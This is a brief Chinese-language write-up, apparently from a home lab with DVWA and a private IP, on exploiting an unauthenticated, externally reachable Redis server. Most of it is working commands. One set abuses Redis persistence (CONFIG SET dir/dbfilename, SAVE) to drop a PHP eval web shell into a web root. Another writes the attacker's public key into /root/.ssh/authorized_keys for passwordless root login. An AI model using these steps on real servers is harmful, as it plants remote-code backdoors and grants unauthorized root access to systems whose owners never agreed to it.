### 一、漏洞存在条件
1. redis开放外部访问
> 在`redis.conf`绑定为本机ip即可，默认为`127.0.0.1`

### 二、利用过程
1. 使用`nmap`扫描目标IP，但是没有扫描出来，直接用`redis-cli`访问成功

2.  利用redis的持久化功能写入后门脚本（方案一）
```shell
    set "test" "<?php @eval($_POST['123']); ?>" 
    onfig set dir /var/www/dvwa   # 设置持久化路径
    config set dbfilename shell.php   # 设置持久化的文件名
    save
```

3. 利用redis的持久化功能写入authorized_keys，实现免密登录
```shell
    (echo -e "\n\n";cat /home/kali/.ssh/id_rsa.pub;echo -e "\n\n") > temp.txt #读取公钥
    cat temp.txt | redis-cli -h 192.168.0.102 -p 6379 -x set "test"  # 把公钥写入key
    config set dir /root/.ssh   # 设置持久化路径
    config set dbfilename authorized_keys  # 设置持久化的文件名
    save
```